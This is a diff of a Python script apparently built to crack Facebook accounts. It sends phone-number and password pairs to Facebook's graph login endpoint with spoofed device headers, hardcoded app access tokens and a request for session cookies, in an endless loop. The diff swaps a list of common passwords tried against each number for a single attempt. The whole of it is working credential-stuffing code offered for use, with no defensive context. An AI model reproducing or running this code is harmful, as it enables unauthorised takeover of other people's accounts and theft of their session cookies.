@@ -1301,53 +1301,21 @@ def chick_Salh(phone, pas):
     sex = random.choice(["Liger", "METERED", "MOBILE.EDGE", "MOBILE.HSPA", "MOBILE.LTE", "MODERATE"])
     current_timestamp = int(time.time())
     pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{pas}"
-    url = "https://b-graph.facebook.com/auth/login"
-    data = {
-                "adid": str(uuid.uuid4()),
-                "format": "json",
-                "device_id": str(uuid.uuid4()),
-                "cpl": "true",
-                "family_device_id": str(uuid.uuid4()),
-                "credentials_type": "device_based_login_password",
-                "error_detail_type": "button_with_disabled",
-                "source": "register_api",
-                "email": phone,
-                "password": pwd_enc,
-                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-                "generate_session_cookies": "1",
-                "meta_inf_fbmeta": "NO_FILE",
-                "advertiser_id": str(uuid.uuid4()),
-                "currently_logged_in_userid": "0",
-                "locale": "en_PK",
-                "device": "Samsung",
-                "sdk": "Android",
-                "client_country_code": "PK",
-                "method": "auth.login",
-                "fb_api_req_friendly_name": "authenticate",
-                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                "api_key": "882a8490361da98702bf97a021ddc14d",
-            }
+    url = "https://graph.facebook.com/auth/login"
+    payload = {
+	  "locale": "ar_AR",
+	  "format": "json",
+	  "email": phone,
+	  "password": pwd_enc,
+	  "access_token": "257637621624717|7e73d6961c0c8fab39f62afdfb77f96b",
+	  "generate_session_cookies": 1
+	}
     headers = {
-                "User-Agent": u(),
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Host": "graph.facebook.com",
-                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
-                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
-                "X-FB-Connection-Type":sex,
-                "Authorization": "OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662",
-                "X-FB-Connection-Quality": sex,
-                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
-                "X-Tigon-Is-Retry": "False",
-                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
-                "x-fb-device-group": "5120",
-                "X-FB-Friendly-Name": "ViewerReactionsMutation",
-                "X-FB-Request-Analytics-Tags": "graphservice",
-                "X-FB-HTTP-Engine": "Liger",
-                "X-FB-Client-IP": "True",
-                "X-FB-Server-Cluster": "True",
-                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
-            }
-    response = requests.post(url, data=data, headers=headers).json()
+	  'User-Agent': u(),
+	  'Accept-Encoding': "gzip",
+	  'content-type': "application/json;charset=utf-8"
+	}
+    response = requests.post(url, data=json.dumps(payload), headers=headers).json()
     response_str = str(response)
     try:
     	idd = response.get('error', {}).get('error_data', {}).get('uid')
@@ -1430,9 +1398,7 @@ choose_country()
 def tt():
     while True:
         phone, pas = gin()
-        passwords = [pas, '123456', '12345678','112233','11223344','qqwweerr','zzxxccvvbbnnmm','20002000','20252025','20242024','20262026']
-        for pwd in passwords:
-            chick_Salh(phone, pwd)
+        chick_Salh(phone, pas)
 os.system('clear')
 logn()
 for i in range(5):
